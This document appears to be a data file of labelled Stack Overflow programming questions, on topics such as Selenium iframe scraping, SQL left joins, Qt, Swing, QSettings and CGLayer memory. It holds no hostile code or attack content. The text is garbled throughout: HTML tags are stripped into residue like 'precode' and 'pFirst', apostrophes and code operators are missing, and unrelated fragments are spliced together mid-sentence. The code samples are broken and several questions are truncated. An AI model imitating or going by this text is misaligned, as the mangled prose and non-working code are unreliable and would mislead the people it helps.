Positive 47561 pFirst of all I apologize for the vague title, but the problem is that Im not sure what is causing the error.p  pIm using Python to extrapolate some data from a website. The code I created works perfectly when passing one link at the time, but somehow breaks when trying to collect the data from the 8000 pages I have it actually breaks way before. The process I need to do is thisp  ol liCollect all the links from one single page 8000 linksli liFrom each link extrapolate another link contained in an iframeli liScrape the date from the link in 2.li ol  pPoint 1 is easy and works fine. Point 2 and 3 works for a while and then I get some errors. Every time at a different point and its never the same. After some tests, I decided to try a different approach and run my code until point 2 on all the links in 1, trying to collect all the links first. And at this point I found out that, probably, I get the error during this stage. The code works like this in a for cycle I pass each item of a list of urls to the function below. Its supposed to search for a link to the Disqus website. There should be only one link and there is always one link. Because with a library as lxml, its not possible to scan inside the iframe, I use selenium and the ChromeDriver.p  precodedef geturlwebpageurl     chromedriverpath Applicationschromedriver      driver  webdriver.Chromechromedriverpath      driver.getwebpageurl     iframesdriver.findelementsbytagnameiframe     listurls[]     urls[]       collects all the urls of all the iframe tags     for iframe in iframes         driver.switchtoframeiframe         time.sleep3         listurls.appenddriver.currenturl         driver.switchtodefaultcontent     driver.quit      for item in listurls         if item.startswithhttpdisqus             urls.appenditem      if lenurlsgt1         print too many urls collected in iframes     else         urlurls[0]      return url codepre  pAt the beginning there was no time.sleep and it worked for roughly 30 links. Then I put a time.sleep2 and it arrived to about 60. Now with time.sleep3 it works for around 130 links. Of course, this cannot be a solution. The error I get now, its always the same index out of range in urlurls[0], but each time with a different link. If I check my code with the single link where it breaks, the code works, so it can actually find urls there. And of course, sometimes passes a link where it stopped before and it works with no issue. I suspect I get this because maybe of a timeout, but of course Im not sure.p  pSo, how can I understand whats the issue, herep  pIf the problem is that it makes too many requests even though the sleep, how can I deal with thisp  pThank you.p

But what if the left outer join performs a join successfully, then finds that another criterion is not satisfied  Is there a way to get the query to return a row with T1 values and T2 values set to NULLp  pHeres the specific query, in which Im trying to return a list of candidates, and the users support for those candidates IF such support exists. p  precode   SELECT c.id, c.name, s.support        FROM candidates c LEFT JOIN support s on s.candidateid  c.id     WHERE c.officeid  5059        AND c.electionid  92        AND s.userid  2 OR s.userid IS NULL  This line seems like the problem  ORDER BY c.lastname, c.name codepre  pThe query joins the candidates and support table, but finds that its a different user who supported this candidate userid3, say.  Then the candidate disappears entirely from the result set.p

Negative 47561 pI was developing a small application using Qt4 to get it crossplatform, but when I compared the result I found a really disturbing issue. p  pOn both Linux KDE4 and Windows 7 my screen resolution is code1680 x 1050code but on KDE my application widgets are bigger and there is not enough place to have both important widgets opened without one being partially hidden. It just looks as if the real resolution is smaller on Linux.p  pDo you have any ideas what is the cause of such situation and if there is any way to handle itp  pThanks in advancep

Negative 47561 pWas there a case in any serverside language where a code did not work in a browser while it did work in the restp  pI am asking this because I cant imagine such a scenario because serverside code runs in the server, not in the browser but I have seen discussions where, as said, there were serverside browser compatibility issues. I cant seem to recall where I have read it.p  pThanks in advance p
Negative 47561 pI use a Webview to display an image with zooming and scrolling enabled. The WebView is set to wrapcontent for the height and width and the zoomcontrols are enabled. p  pIf the image is smaller then the screen the webview will show just the image and there is lots of space left on the screen. The moment the user zooms the WebView will grow to fit the new imagesize. The problem is that the zoomcontrols stay at the same spot and stop working after the webview is resized. If I let them fade out and touch the view again they will appear at the new bottom of the view and work again. p  pThis seems like a bug in the webview to me. Is there a way to capture the resize of the webview and then disable and enable the zoomcontrolsp

Whenever I try to drag the Connection to Files Owner, the only option that shows up is View.p  pIf I look at the Controller under the Library Window of Interface Builder, the Label shows up as a UILabel under Outlets.  I am pretty sure that it used to be a type id, but it automatically shows up as UILabel and if I try to add an id one, it doesnt work either.p  pCan someone point me to somewhere to explain this stupid thing  It should not be this difficult to make a label have text.p

Negative 47561 pI have a Silverlight 4 app using RIA Services in which I moved all of the RIA Servicesspecific code to a separate module a WCF RIA Services class library called AppServices. Lets call the main app Silverlight4App. I need to authenticate the users against a different database than the database where the rest of the data is stored.

I can setup a manual Linux server for them, because the hosting company they use is one that Ive never heard of.p  pThe site owners are completely technologically impaired, so I dont want to scare them off by showing them a dynamic CMS with tons of features, as they think pure HTML is so much safer, they have to go out of their way to work with it.p  pI know this is a ton of writing, but what would be the emmost appropriate CMSem for such a setup hardcoding or dynamically generating content for such a setup I dont want to keep having the person manually write nonstandards compliant quadruplenested table layouts anymore, but I dont want to be responsible for having their site hacked...p  pThanksp

Negative 47561 pSay I have two web servers, one local development and one live. p  pUnder SVN I would checkout the website files to my local webservers publichtml directory and also to the live webservers publichtml directory. I would then work on the files directly on the local server and commit any changes to the central repository. p  pWhen Im ready for those changes to go live on the live server, I would SSH in and perform an SVN update.p  pEssentially I have two working copies, one on live and one locally, though other users may also have working copies on their local machines. But there will only ever be one working copy on the live server. The reason for this is so that we can just perform SVN update on live server every time we want changes to be published.p  pHow can a simiar workflow be accomplished using GIT p

Negative 47561 pI have the following asynchronous controller actions which allows me to start a console application on a remote server. My issue is with regards to the permissions and authentication. I have tried the following, emwhich in my understanding allows the codeapp.StartvaluationDatecode to run as the impersonated userem. The reason for this is that the console application needs to access network resources and the user of this web app will have the required access rights. As a side note, the console app runs as a scheduled task without errorp  pThe issue I suspect is that the console app is still run under the IIS app pool identity which causes network resource Access Denied errors. The console application itself starts, but the restricted access of the IIS user account causes the failure.p  pI have tried changing the AppPool identity to run as an authorised user and the process executes correctly.

Negative 47561 pThis may seem like a blast from the past but due to project constraints I am stuck with quirks mode and tables...p  pThe tables that im dealing with have a single image in each cell where all the cells should be the same size. The tables width and height are set as percentages of a parent container.p  pThe problem is the images dont resize down, they stay at their original size seemingly no matter what I do. Then the table doesnt adhere to its set size, it has resized to hold all of the images. In standards mode I believe width 100 on the image gets closer to what I want to achieve.p  pIm considering a javascript solution which loops over each image calculating what their size should be and resizing manually. But this is probably going to cause a bit of a loading time at the start which isnt ideal.p  pstrongEditstrongp  pI have written a basic example at a hrefhttpjsbin.comemudo4 relnofollowJSBina.

Negative 47561 pI am running into an issue while attempting to determine code coverage on our site. I have PHPUnit generating a html code coverage report while running our unit tests on our three apps. We have a public app, an admin app, and a reporting app. Id like to somehow combine these into one code coverage report since the apps share code. It seems that the code coverage is only calculating coverage on the files that the tests touch, so completely untested files arent being used in the calculation. Does anyone know how to pull these unused files into the calculation Is there a way to tell the coverage generator to calculate using certain directories so that it pulls in the files that arent touched I have a whitelist set up in the config file for phpunit set to the root of our project. All comments, answers, and bits of advice are welcome. Thanks in advancep

Negative 47561 pI have a class codeTargetcode and a static property, in another class, called codepointscode. Each time the user hits a target, I want to increase the points. The reason I put codepointscode in a different static class is so that each codeTargetcode object can access it.  The problem is that the textblock displaying the points exists in the MainPage and not in each Target object. Since I cant bind my XAML to a static property, how can I make it so that each Target object can somehow let the MainPage know that it should update the points textblock thanks for any advicep

Negative 47561 pUsually Im using codeRequestScopedcode or codeSessionScopedcode from codejavax.enterprise.contextcode to inject objects for instance in faces beans using codeInjectcode. I am also using EJBs. As I understood, a set of stateless EJB copies pool is used to be injected to objects. The reason there are many copies is to ensure one instance of EJB isnt accessed concurrently. When speaking about stateful EJBs again as I understood, one instance of such is bound to concrete injection point. And they are injected using codeEJBcode the stateless ones too.p  pstrongFrequently I can see on the web examples of using codeStatelesscode or codeStatefulcode in conjunction with codeScopedcode. What is the meaning of themstrong p  pstrongEditstrong trying to clarify as no one responded to this momentp  pIm especially interested whether such scoped annotations change anyhow and if they  how moment of creation of EJBs instance.  For my understanding if I have, codeEJBcode annotated field, object of proper class is injected there. If such EJB is stateless, container simply take free instance from the pool of precreated instances. Pool can be resized if necessary. It is stateless, because object isnt guaranteed to be preserved across method calls of our class i.e. class which has field containing reference to EJB.p  pWe can also use stateful EJB and in that case one instance is preserved during method calls. As I think, it will be simply injected once per object creation. There is also singleton EJB, which is shared between all objects.p  pI cant find the purpose of Scoped annotations for EJB here.p  pstrongEdit 2strongp  pOne can use such combination of annotations if class is to be injected via EJB and DI by codeInjectcode mechanisms. This is rather, however, special case and not elegant. I am asking if you know any other reasons.p  pstrongEdit 3strong Please see my comment under arjans answer.p

Each environment should be sandboxed so that it is local to the robot in terms of how it interacts with the rest of the game.  p  pOriginally I was going to implement the HACK VM as described in the book Elements of Computing Systems, but then got curious as to whether there is a better solution in terms of performance for this style of game.  p  pSo my question is  Is there a virtual machine architecture already existing that would serve my purpose well  p  pP.s. The language and game engine to be used has not been decided yet, but will probably be either C or smalltalk.    p

Negative 47561 pIve been learning android programming for some days. I am creating an ebook application which reads images from the drawable folder. Ive successfully implemented the pageviewer activity which loads bitmaps using asyncTask in background and shows a text loading... until loading is completed.p  pI wanted to show a pagelist in another activity using gridview so that user can scroll through a grid of pages and select any. I followed the android gridview tutorial and wasnt much problem. But since i have about 50 images in drawable and it seems gridview adapter shows the grid once all images are croped and placed in grid. It takes a lot of time to show the grid and its quite slow on scroll.p  pI was wondering if there was a better way to show the grid, asynchronously, like show the first item and then the 2nd and so on, instead of waiting for a long time and displaying the grid. I saw some topics like lazy load which seems similar to what i want, but they all show image from web, it was confusing. Hope i can get some sugestions, or if there is any other way.p

When a method or function returns, the one that called it still has a reference to its own arguments. So there must me a reference to codearg1code and codearg2code somewhere.

Negative 47561 pIm having some difficulity with a custom TraceListener. The issue is that writing a single trace line produces two calls, one to Write, the other to WriteLine.

However when you press back it goes back to the loading activity which obviously i dont want.p  pSolution I set this in the manifest androidnoHistorytrue for the loading screen activity. But there is an issue with this, my application is a root app so it needs superuser permissions in the loader screen and when the su dialog appears asking to accept or decline the loading screen closes since history is off and another app has taken the view. I have found that if i remove noHistory from the manifest su doesnt close my app so i know thats what it is. p  pSo the final question then is, is there a flag or something i can set on the intent to keep the loader out of history when the intent is launched at the end after weve gained superuser permissions cause i need to keep the loader open when superuser comes up but dont want it there when the user hits backp  pThank you for any helpp

Negative 47561 pI have been struggling with choosing unobtrusive javascript over defining it within the html syntax. I want to convince my self to go the unobtrusive route, but I am having trouble getting past the issues listed below. Can you please help convince me p  p1 When you bind events unobtrusively, there is extra overhead on the clients machine to find that html element, where as when you do stuff, you dont have to iterate the DOM.p  p2 There is a lag between when events are bound using document.ready jquery and when the page loads. This is more apparent on very large sites.p  p3 If you bind events onclick etc unobtrusively, there is no way of looking at the html code and knowing that there is an event bound to a particular class or id. This can become problematic when updating the markup and not realizing that you may be effecting javascript code. Is there a naming convention when defining css elements which are used to bind javascript events i have seen ppl use jsclassNamep  p4 For a site, there  are different pieces of javascript for different pages. For example Header.html contains a nav which triggers javascript events on all pages, where as homepage.html and searchPage.html contains elements that trigger javascript on their respective pages p  psudo code examplep  pheader.htmlp  precodeltscript src..myJS.jsgtltscriptgt ltdivgtHeaderltdivgt ltulgt ltligtnav1ltligtltligtnav2ltligt ltulgt codepre  phomepage.htmlp  precodeltinclude header.htmlgt ltdiv classhomepageDivgtsome stuffltdivgt codepre  psearchpage.htmlp  precodeltinclude header.htmlgt ltdiv classsearchpageDivgtsome other stuffltdivgt codepre  pmyJS.jsp  precodedocument.readyfunction ul.li.bindclick,doSomething .homePageDiv.bindclick,doSomethingElse .searchPageDiv.bindclick,doSomethingSearchy  codepre  pIn this case when you are on the searchPage it will still try to look for the homepageDiv which does not exist and fail. This will not effect the functionality but thats an additional unnecessary traversal. I could break this up into seperate javascript files, but then the browser has to download multiple files, and I cant just serve one file and have it cached for all pages. p  pWhat is the best way to use unobtrusive javascript so that I could easily maintain a  pretty script heavy website, so another developer is aware of scripts being bound to html elements when they are modifying my code. And serve the code so that the clients browser is not looking for elements which do not exist on a particular page but may exist on others.p  pThanksp

Negative 47561 pIve got an app that allows the user to save the app SQLite database files to the SD card. This function has been in place for over a year and has worked just fine.

Has anyone seen this problem before, and know of any possible causes andor solutionsp  pstrongUpdatestrong In case it makes any difference, I found out from the user that his phone is an HTC Evo 4G. I thought I read something somewhere about encrypted database files in more recent Android releases, where the database files are stored under datasecure... rather than datadata... I wonder if this could be related In any case, after questioning the user further, I at least know that it is one specific table in the database file that is having a problem. Different parts of my app interact with different tables within the database file. The app works fine, and allows him to saveread data when he accesses the other tables, but when he accesses one particular table, just trying to open the file produces his error. Im thinking I can add an ugly fix that catches this exception if it occurs and then drop the corrupted table and then recreate it. Thoughtsp

Negative 47561 pI currently have an old unmanaged C DLL using MFC. This DLL has a bunch of code which is multithreaded and written back in 2003 using VC6.

Someone before me had already rewritten it in C, and I need to port that C code over to VC. I did some research and realized that I could save some time in the porting process by just porting the C code to VC using the .NET framework. But then I realized that my old MFC DLL cannot run this .NET code. p  pMy idea is to write this multithreaded code in a VC DLL using the .NET framework and using some form of interoperability to be able to call the functions from the old DLL to the new DLL.p  pI have looked into COM interoperability as well as wrapper classes. What is the best way of accomplishing this Are there any tutorials that could help me with this task Ive already done some extensive searching and there are a lot of tutorials using unmanaged C DLLs to C DLLs, but not much that pertains to my situtation.p  pJust so you know, I cannot compile the old DLL with clr as this DLL is hosted in an old Win32 application as well.

Negative 47561 pWe have a DX gridview being rendered in a specifically designed view. We pass a predefined ViewModel object whose values are filled from a Linq2Entities query. The problem is that in our callback function the L2E query is actually executed on the DB before any filtering, sorting and paging has been performed by the DevExpress grid. IE. simplified example, in the actual situation we select data from several tables but still in a single linq queryp  precodepublic ActionResult GridViewPartialstring myParameters       var modelData  from s in db.myTable                                       select new  modelName  s.Name       return PartialViewGridViewPartial, modelData  codepre  pIn this situation the query is actually executed before the data has been passed to the View. Therefore it actually selects way too much data from the DB while the gridview only displays the selected page. p  pHow would we have to modify the query so it only selects the data of the page the user has selected IE. skip 10 rows and take 10 in the L2E query when the user selects page 2, instead of selecting 100000 rows if there are that many in the table and afterwards applying the filteringsortingpaging, like in the described situationp

Yet another approach used a more calculus based approach that watches for some velocity  gradient aspects.  None seemed to hit the sweet spot, probably due to my lack of experience in statistical analysis.p  pPerhaps I need to use some kind of a statistical analysis package to cover my bases vs writing my own algorithm Or would there be an efficient method for tackling this directly with SQL with some kind of local max techniques Im simply not sure how to approach this efficiently.

I am pretty much clueless in here.p  pstrongEDITstrong The problem lay with the localization on Azure. On my local machine the date format is ddmmyyyy, whereas on Azure it is mmddyyyy.

Negative 47561 pAlright, Ive been scratching my head over this one for the better part of the day, Google has been of little help, my fellow project mates have not been able to solve it either and were less than a day away from our deadline. Help us ObiOne Stackoverflow, youre our only hopep  pI have a DataGrid which consists of a variable number of columns of variable types DataGridTextColumn, DataGridComboBoxColumn, DataGridCheckBoxColumnp  pand I need to bind data to them.p  pEach of these columns will represent a databasequery which is the reason for the grid having to be very flexible. What I need help with is how to bind and add data to these columns in the codebehind part.p  pemEDITem  It seems I forgot to make this clear some columns will contain data of the same type in our instance Grade. Depending on the subtype of this object we will need a different type for the column. As such, the Grid will have n columns, some of which have to be bound to data of the same type.p  pemEND EDITemp  pI cannot design a containerclass which has one Property for each column since they change dynamically, From what Ive read I cannot bind the columns to different indices of an array, and the last approachidea I had is to bind the different columns to a string representing the type of the data checkbox, string, combobox and then simply add a container which has a property with that name to each individual column. I couldnt find a way to do this since there doesnt seem to be an Add method to invoke on the grids columns To summarize in wishfulthinkingcode what I need is something looking like thisp  precodeCreate an arbitrary number of columns forint i  0 i lt NRCHECKBOXES i      DataGridCheckBoxColumn col  new DataGridCheckBoxColumn     col.Header  titles[i]     which are bound to a container with correct type of data     col.Binding  new Bindingcheckboxes[  i  ]     grid.Columns.Addcol   grid.Addcheckboxes and then populate the grid codepre  por something like thisp  precodeCreate an arbitrary number of columns forint i  0 i lt NRCHECKBOXES i      DataGridCheckBoxColumn col  new DataGridCheckBoxColumn     col.Header  titles[i]     col.Binding  new BindingData     col.Addcheckboxes[i] Populate the column specifically     grid.Columns.Addcol  codepre  pwhere checkboxes is a list of objects that has the property Data sorry, couldnt codify this inline by pressing tab then , probably since Im on a Swedish keyboard. These loops would then be copied for each type of column and data I have ComboBoxes and TextBoxes.p  pI hope this is enough to explain my problem, and that someone out there knows the proper way to achieve this in WPF.p

Negative 47561 pWe have an application which has about 15000 pages. For better SEO reasons we had to change the URLs. Google had already crawled all of these pages earlier and due to the change, we see a lot of duplicate titlesmeta description on webmasters. Our impressions on google have dropped and we believe this is the reason. Correct me if my assumption is incorrect. Now we are not able to write a regular expression for the change of URLs using a 301 redirect, because the change was such. The only way to do it would be to write 301 redirects for individual URLs which is not feasible for 10000 URLs. Now can we use a robots meta tag with NOINDEX strongMy question basically is if I write a NOINDEX metatag will google remove the already indexed URLsstrong If not what are the other ways to remove the old indexed URLs from google ANother thing which I can do is make all the previous pages 404 errors to avoid the duplicates, but will that be a right thing to dop

Negative 47561 pThis is a weird problem.  I have a solution for it, but I dont know WHY the problem occurs in the first place.  Observe the code belowp  precode VERSION 1  public class test       public static void mainString[] args          JFrame mainFrame  new JFrameTest         JPanel inputPanel  new JPanel          mainFrame.setDefaultCloseOperationJFrame.EXITONCLOSE         mainFrame.getContentPane.addBorderLayout.CENTER, inputPanel         mainFrame.setBounds100, 50, 200, 100         mainFrame.setVisibletrue          JButton inputFileButton  new JButtonBROWSE         inputPanel.addinputFileButton       codepre  pIt works as expected.  The button does nothing, but it renders correctly.  Now, I add a JFileChooser which I plan to do something with later, but for now all Im doing is instantiating it.p  precode VERSION 2  public class test       public static void mainString[] args          JFrame mainFrame  new JFrameTest         JPanel inputPanel  new JPanel          mainFrame.setDefaultCloseOperationJFrame.EXITONCLOSE         mainFrame.getContentPane.addBorderLayout.CENTER, inputPanel         mainFrame.setBounds100, 50, 200, 100         mainFrame.setVisibletrue          JFileChooser inputFileChooser  new JFileChooser  NEW LINE          JButton inputFileButton  new JButtonBROWSE         inputPanel.addinputFileButton       codepre  pAll of a sudden my button no longer renders.

One way to fix itp  precode VERSION 3  public class test       public static void mainString[] args          JFrame mainFrame  new JFrameTest         JPanel inputPanel  new JPanel          mainFrame.setDefaultCloseOperationJFrame.EXITONCLOSE         mainFrame.getContentPane.addBorderLayout.CENTER, inputPanel         mainFrame.setBounds100, 50, 200, 100         mainFrame.setVisibletrue          JButton inputFileButton  new JButtonBROWSE         inputPanel.addinputFileButton          JFileChooser inputFileChooser  new JFileChooser  MOVE LINE TO END       codepre  pSo moving that line to the end allows the button to render again, but that still makes no sense to me what an instantiated JFileChooser has to do with the unconnected button.  Another way I can fix this issuep  precode VERSION 4  public class test       public static void mainString[] args          JFrame mainFrame  new JFrameTest         JPanel inputPanel  new JPanel          mainFrame.setDefaultCloseOperationJFrame.EXITONCLOSE         mainFrame.getContentPane.addBorderLayout.CENTER, inputPanel         mainFrame.setBounds100, 50, 200, 100          JFileChooser inputFileChooser  new JFileChooser          JButton inputFileButton  new JButtonBROWSE         inputPanel.addinputFileButton          mainFrame.setVisibletrue  MOVE THIS LINE TO THE END                   codepre  pIt kind of makes sense why the version above fixes the problem... obviously something about the JFileChoose instantiation was making my button invisible, but this setVisible method afterwards bring it back into the light.  But that still doesnt tell me WHY it went invisible in the first place.p  pCan somebody please help me figure out what Im missing  Thanksp

Negative 47561 pI realized Firefox treats emclickem event on codeltselectgtcode tag differently from WebkitIE, and I couldnt figure out why or how to resolve this difference. p  pSpecifically, WebkitIE regards each emclickem event on codeltselectgtcode  as a combination of strongbothstrong clicking on select, strongandstrong the clicking of one of the dropdown codeltoptiongtcode, shown in graphs belowp  pFirst Click p  pimg srchttpi.stack.imgur.com2Q6ZU.jpg altFirst clickp  pSecond Clickp  pimg srchttpi.stack.imgur.com0woDG.jpg altSecond clickp  pIn WebkitIE, emclickem event will be fired only after both clicks have been done.p  pHowever, in Firefox, the first click on the codeltselectgtcode tag is regarded as a emclickem event, the second click to select codeltoptiongtcode is regarded as another emclickem event. Therefore, strongtwostrong emclickem events have been fired in Firefox comparing to strongonestrong in WebkitIE for the same operation.p  pNow to demonstrate it in code example, assuming we have a hrefhttpjsfiddle.netSBZD8JSfiddle linkap  precodeltselect idselgt     ltoptiongtoneltoptiongt     ltoptiongttwoltoptiongt     ltoptiongtthreeltoptiongt ltselectgt ltscriptgt function select      sel.oneclick, functionevent          console.logmouse down         sel.oneclick, function              console.logmouse down again             sel.off             select                document.readyfunction      select  ltscriptgt codepre  pIn WebkitIE, performing the set of operations shown above in the graph for the first time will give outputp  precodemouse down codepre  pIn Firefox, it will give p  precodemouse down mouse down again codepre  pWhy is it so and how do I fix itp  pEdit I tried with pure JavaScript without jQuery, the result remains the same.p  pEdit 2 A little more context, I originally answered this question a hrefhttpstackoverflow.comquestions9972280onclickonoptiontagnotworkingonieandchrome1005896010058960onclick on option tag not working on IE and chromea and won a bounty for my answer. However, as the op later pointed out, my solution did not work on Firefox. I decided to dig deeper to resolve this problem, and hence this question was asked and I am rewarding that 50 bounty I got from that solution. Essentially, the problem is to create a select menu that will trigger an event whenever a selection is made, even when it is the same. This has proven to be harder than expected, if possible at all due to different browser implementations.p  pEdit 3 I am fully aware of codeonchangecode, but the question here is not about codeonchangecode if you read carefully. I need to have each selection trigger an event emeven ifem they are the same selection which will not trigger codeonchangecode. p

Negative 47561 pIm rusty on concurrency programming, and am hoping that someone can provide some insight into a concurrency pattern that Im evaluating.p  pThe idea is that I have an object that operates in nonblocking mode for the majority of the time however, under certain conditions, a method is called that requires the object to operate synchronously. p  pBelow is some sample Java code that I sketched up to illustrate the problem. p  pThe idea is that multiple threads can safely call all the methods on this object except for this one method called SyncMethod. This method is called under certain conditions, and when this happens, there are certain methods like SyncAsyncMethod that need to redirect threads down a synchronized critical code path. In order to facilitate this, I store some states in atomic variables to track state, and also the number of threads running in asynchronous sections.p  pIts been a while since Ive done concurrency programming, so if Im over complicating the logic or overlooking a race condition, please let me know p  pAdditionally, Im also assuming that all this logic is worthwhile to improve performance over synchronizing all my methods. Does anyone know if the checks on the Atomic variables are costlyp  pLastly, does anyone know if there is a name for this patternp  pThanks, Dylanp  ppublic class MyObject p  precodeprivate AtomicBoolean mSyncMode private AtomicBoolean mOutOfAsyncZone private AtomicInteger mAsyncThreads  public MyObject      mSyncMode.setfalse     mOutOfAsyncZone.setfalse     mAsyncThreads0   this method must always run synchronized... public synchronized void SyncMethod      ifmSyncMode.get         SetSyncModetrue      ifmSyncThreads gt 0         wait      do stuff....

In other words, the codehashcode returned will be a hash of every element of the classp  pAt this stage, I would like to run a set intersection operation by code.namecode only, to find, say, codePersonBar, 1.intersectionunionlist  [PersonBar, 1, PersonBar, 22, PersonBar, 24]code. the typical code.intersectioncode at this point would not give me anything, I cant override codehashcode or codeeqcode on the codePersoncode class, as this would override the original set union I emthinkemp  pWhats the best way to do this in Python 2.xp  pEDIT Note that the solution doesnt emhaveem to rely on a codesetcode. However, I need to find unions and then intersections, so it feels like this is amenable to a set but Im willing to accept solutions that use whatever magic you deem worthy, so long as it solves my problemp

Negative 47561 pSo Im not sure how this works.

I plan on using this class I created, p  precodeAddress  NSObject codepre  pas opposed to the MKPlacemark class when I place pins on the map.

Negative 47561 pI am creating a 2D game. I implemented a physics engine in the game so when the player jumps  his arc follows the path given his velocity and the gravity in the game. When the player is falling its distance fallen will continue to get larger and larger because it has acceleration.p  pHow do I know if the player collides with something in its path if the new location puts the player on the other side of the objectp  pI could use a loop and test every point along the players path. Is this the only way to do it Is there a more elegant algorithm or pygame solutionp

Negative 47561 pIm an iOS developer making the jump to Android to port a project Im working on and I appear to be failing to grasp a few concepts on Androids custom BaseAdapter. Im working on an app that parses XML from a site and populates the text from the XML elements into a ListView. I have the XML parsing portion down with no problem. The problem I run into is with adding a button to each row in the list view. I understand the concept of setting the OnClick Listener and that I need to implement a BaseAdapter, but I cant seem to get my data from my main activity to the class I have setup that contains my BaseAdapter. Right now the data does not show up when the app is launched. Ive performed some debugging and verified that the data from the menuItems ArrayList is sent properly to the BaseAdapter class, Im just not getting how to get it displayed in the ListView. Its probably something really small I think Ive just looked at it for too long and am not seeing it. Any help would be greatly appreciated.

I created two view controllers, one with red background and other with green. I dragged and dropped swipe gesture recognizers on the red one and related the gesture to view controller to the other one using Modal. But only default transitions I see are flip horizontalvertical,  cross dissolve, partial curl. Nothing like what they have going on. So how are they doing that Changing to Push doesnt do anything.pli lipIf I use storyboard then I am limiting the cities user can enter. Meaning if I have two view controllers then view controller 1 will show weather for city 1, view controller 2 will show weather for city 2. Basically swipes are limited to how many controllers I have defined. one for each city. Is there a way I can make this dynamic Users can have Nnumber of cities and Nnumber of swipes. Similar behavior to weather app that comes built in with every iPhone.  pli ol

They can be pretty large. Were talking 55mb when it comes to mammography. The pixel data is 16bit greyscale stored in a ushort array.

Is it worth diving into it Would it be any faster than the native WPF stuff If so how significantly Or, should I just forget about DirectX and look into areas where I can improve my current approachp  pBefore somebody says so, I know WPF utilize DirectX. Im wondering If removing the WPF layer and writing the DirectX myself will improve performance.p

Negative 47561 pIm having an issue with Socket.io receiving messages just before a page navigation happens  generally when the message is a direct result of some serverside action triggered by the navigation.p  pWhat Im seeing right now looks like thisp  ol liSocket.io connectsli liUser triggers a page navigation submits a form, refreshes, etc.li liServerside logic sends a request to the socket.io server, which immediately dispatches the event to the stillconnected clientli liThe client receives and confirms the request Im pretty sure theres some confirmation of messages builtin to socket.io, correct me if Im wrong, and would display a notification to the user, but then ...li liThe socket.io connection closes on the original pageli liThe new page loads and displaysli liSocket.io opens a new connection, but theres no new messages, because the last one was received and confirmed.li ol  pThis isnt really a bug, per se, since I dont think its reasonable to expect Socket.io to close the connection in advance of a navigation occurring. However, Im not really sure what the best way to handle this is. Currently I keep one connection open perclient at a time, and close the other when a new one connects. This doesnt happen in this case though, since the first one has closed before the second one connects. I also could keep a list of all clients, but that wouldnt solve this problem either, because the message would still be received by the first connection.p  pCan someone suggest a solution to this problem that would ensure the user always sees a notification for the messagep

Negative 47561 pIve got a problem in a big project. Ill try to boil it down to what I hope are the important points.  I have an app that consists of several codeActivitycodes, one of which is the main navigation point that the others are launched from.  p  pOnce the main codeActivitycode gets destroyed and recreated by navigating to another codeActivitycode and back, view updates dont seem to work.  Specifically, I have a codeButtoncode and several codeTextViewcodes.  After the codeActivitycode is recreated, I cant change their text.  Ive tried changing the codeActivitycode background color, and that doesnt work, either.p  pMy first thought was that I missed an important data member during the saverestore process.  However, Ive looked at that quite a bit, and I think thats not the problem.  Also, Ive tried not loading the saved data and starting fresh and it still doesnt update the views.p  pNext, I considered that I might not be updating on the UI thread.  Im certain that causes an exception, but to be sure, I posted refreshes to codeHandlercode.  Still no dice.p  pI can, however, get limited UI changes visible if I wire them to an codeonClickcode.  What works and what doesnt in that case raises other questions some of the data is corrupted, so right now thats where Im concentrating my investigation.  Ill provide an update once I get more of that mapped out. p  pWhat else should I be looking atp  pUPDATE Adding some snippetsp  pFrom codeonCreatecodep  precodeif savedInstanceState  null    Log.vCalculations.log, Restarting with saved instance state   Serializable ser  savedInstanceState.getSerializableinfusion   if ser  null ampamp ser instanceof Infusion      mInfusion  Infusion ser      mBeganEditing  savedInstanceState.getBooleanediting,     mInfusion  null   Log.vCalculations.log, this.toString  codepre  pand its matching codeonSaveInstanceStatecodep  precodeOverride protected void onSaveInstanceStateBundle outState      Log.vCalculations.log, StageInfusiononSaveInstanceState     Log.vCalculations.log, this.toString     outState.putSerializableinfusion, mInfusion     outState.putBooleanediting, mBeganEditing     outState.putBooleanresume, true     ServerManager.stopListening      super.onSaveInstanceStateoutState  codepre  pI expect that there are other members that should be saved, but theyre of minor consequence.p

Negative 47561 pIm thinking about using Qt Quick to build desktop applications, since it looks more friendly for someone like me that is coming from web development using node.js, but is it possible to do AJAX and populate controls like a codeGridViewcode only using QMLp
Negative 47561 pI have a Qt application that requires the ability to load from several settings files to behave in a distinct way. For example lets say my app can support several variations, VAR1, VAR2, VAR3, ...  One of my menu entries allows me to load settings. Currently, I do this using a QSettings object and it works fine. But now I want to implement a different variation. Instead of manually setting 20 or more settings, I would like to load from a preconfigured settings file.p  pQSettings does not allow me to change source, as far as I can tell. I looked at the static method QSettingssetPath but that can only be done once prior to instantiating the QSettings object.p  pMy hope is to create ways to   1  Load factory defaults   2  Save a user settings file with a user specified name   3  Recall a user settings file by name.p  pI would prefer not to have to rewrite QSettings to meet my needs if at all possible.p

Negative 47561 pI have a question similar to this onep  pa hrefhttpstackoverflow.comquestions7220398cglayerrefinnsvaluewhentocallretainorreleaseCGLayerRef in NSValue  when to call retain or releaseap  pI am drawing 24 circles as radial gradients in a view.  To speed it up I am drawing the gradient into a layer and then drawing the layer 24 times.  This worked really well to speed up the rendering.  On subsequent drawRect calls some of the circles may need to be redrawn with a different hue, while others remain the same.p  pEvery time through drawRect I recalculate a new gradient with the new hue and draw it into a new layer.  I then loop through the circles, drawing them with the original layergradient or new layergradient as appropriate.  I have a 24 element NSMutableArray that stores a CGLayerRef for each circle.p  pI think this is the answer provided in the question I linked above, however it is not working for me.  The second time through drawRect, any circle that is drawn using the CGLayerRef that was stored in the array causes the program to crash when calling CGContextDrawLayerAtPoint.  In the debugger I have verified that the actual hex value of the original CGLayerRef is stored properly into the array, and in the second time through drawRect that the same hex value is passed to CGContextDrawLayerAtPoint.p  pFurther, I find that if I dont CGLayerRelease the layer then the program doesnt crash, it works fine.  This tells me that something is going wrong with the memory management of the layer.  Its my understanding that storing an object into an NSArray will increment its reference count, and it wont be deallocated until the array releases it.p  pAnyway, here is the relevant code from drawRect.  Down at the bottom you can see that I commented out CGLayerRelease.  In this configuration the app doesnt crash although I think this is a resource leak.  If I uncomment that release then the app crashes the second time though drawRect between the first and second calls one of the circles has its ledinfo.selected property cleared, indicating that it should use the saved layer rather than the new layerp  precodeNSLogledView drawing hue4f sat4f numd sized,hueslidervalue,satslidervalue,self.numleds,self.ledsize rgbcolor  [UIColor colorWithHue1.0 saturation1.0 brightness1.0 alpha1.0] endcolor  [UIColor colorWithHue1.0 saturation1.0 brightness1.0 alpha0.0] NSArray colors  [NSArray arrayWithObjects                    idrgbcolor.CGColor, idendcolor.CGColor, nil] CGColorSpaceRef 